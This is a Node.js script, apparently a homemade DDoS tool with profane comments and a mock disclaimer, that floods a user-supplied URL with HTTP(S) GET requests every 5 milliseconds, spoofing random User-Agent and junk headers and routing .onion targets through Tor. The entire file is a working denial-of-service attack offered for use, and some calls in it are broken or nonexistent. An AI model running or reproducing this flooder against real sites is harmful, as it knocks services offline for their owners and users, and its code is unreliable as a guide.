// WARNING: THIS TOOL IS FOR EXPERIMENTAL AND EDUCATIONAL PURPOSES ONLY.
// MISUSE CAN RESULT IN SEVERE LEGAL CONSEQUENCES. USE AT YOUR OWN RISK.
// THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL. FUCK IT UP. BIGMANCOZMO IS NOT RESPONSIBLE.

// DISCLAIMER: THIS TOOL IS CAPABLE OF CAUSING SIGNIFICANT DISRUPTION.
// IT SHOULD NOT BE USED AGAINST SITES WITHOUT EXPLICIT PERMISSION.
// TARGETING SITES WITHOUT AUTHORIZATION IS ILLEGAL, UNLESS YOU ARE ME.

const chalk = require('chalk'); // For colored console output (install using npm install chalk)
const ddosLog = require('fs').createWriteStream('ddos_log.txt', { flags: 'a' }); // Logging to a file (requires 'fs' module)
const crypto = require('crypto'); // for generating random shit
const http = require('http'); // basic http
const https = require('https'); // secure!

const targetURL = process.argv[2]; // Get target URL from command line
const threads = process.argv[3] || 10; // Number of threads (default 10)
const onion = targetURL.includes('.onion'); // Is it a dark web site?
const torProxy = 'socks5h://127.0.0.1:9050'; // Default Tor proxy, adjust if needed

if (!targetURL) {
    console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads]"));
    process.exit(1);
}

console.log(chalk.green.bold(`Starting DDoS attack on ${targetURL} with ${threads} threads. Prepare for some fucking chaos. Press Ctrl+C to stop.`));

function logAction(message) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;

    ddosLog.write(logMessage, (err) => {
        if (err) console.error(chalk.red(`Fucking error writing to log file: ${err}`));
    });

    console.log(chalk.blue(logMessage.trim())); // Also output to console
}

function getRandomString(length) {
    return crypto.randomBytes(length).toString('hex');
}

function attack() {
    const options = {
        url: targetURL,
        method: 'GET',
        headers: {
            'User-Agent': getRandomString(32), // Spoof user agent
            'Cache-Control': 'no-cache',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Fuck-You': getRandomString(64) // Add some random headers
        },
    };

    const protocol = targetURL.startsWith('https') ? https : http; // Choose http or https
    
    if (onion) {
        const SocksProxyAgent = require('socks-proxy-agent'); // Tor proxy agent
        options.agent = new SocksProxyAgent(torProxy); // use tor proxy on .onion

    }
    
    protocol.get(options, (res) => {
        logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} , Request was successful, but who fucking cares`));
        res.on('data', () => {
            //Consume the fucking data
        });
        res.on('end', () => {
            //fuck, end of data
        });

    }).on('error', (err) => {
        logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} , Request failed because this site is garbage. Error: ${err.message}`));
    });
}

function flood() {
    for (let i = 0; i < threads; i++) {
        attack();
    }
}

setInterval(flood, 5); // Adjust timing to your fucking liking, but go fuckin' nuts

process.on('SIGINT', () => {
    console.log(chalk.purple.bold("\nStopping DDoS attack."));
    ddosLog.end(() => {
        console.log(chalk.dark_blue("DDoS log file closed."));
        process.exit();
    });
});